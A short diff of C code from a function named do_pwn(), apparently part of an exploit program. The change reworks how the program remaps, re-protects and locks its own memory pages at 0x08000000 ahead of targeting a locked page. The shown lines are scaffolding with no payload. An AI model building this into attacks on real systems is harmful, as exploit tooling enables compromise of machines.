@@ -101,15 +101,20 @@ void do_pwn() {
     
     assert(!mlock((void *) target_pagebase, 0x2000));
 
-    // I don't even want to know...
-    char buf[0x3000];
-    memcpy(buf, (void *) 0x08000000, 0x3000);
-    assert(!munmap((void *) 0x08000000, 0x3000));
-    assert(MAP_FAILED != mmap((void *) 0x08000000, 0x3000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0));
-    memcpy((void *) 0x08000000, buf, 0x3000);
-    assert(!mprotect((void *)0x08000000, 0x2000, PROT_READ | PROT_EXEC));
+    // ew, ew...
+    static const uint32_t txtsize = DEBUG ? 0x2000 : 0x1000;
+    static const uint32_t dtasize = 0x1000;
+    static const uint32_t totalsize = txtsize + dtasize;
 
-    assert(!mlock((void *) 0x08000000, 0x3000));
+    // I don't even want to know...
+    char buf[totalsize];
+    memcpy(buf, (void *) 0x08000000, totalsize);
+    assert(!munmap((void *) 0x08000000, totalsize));
+    assert(MAP_FAILED != mmap((void *) 0x08000000, totalsize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0));
+    memcpy((void *) 0x08000000, buf, totalsize);
+    assert(!mprotect((void *) (0x08000000+dtasize), txtsize, PROT_READ | PROT_EXEC));
+
+    assert(!mlock((void *) 0x08000000, totalsize));
 #if DEBUG
     printf("ok\n"); fflush(stdout);
 #endif
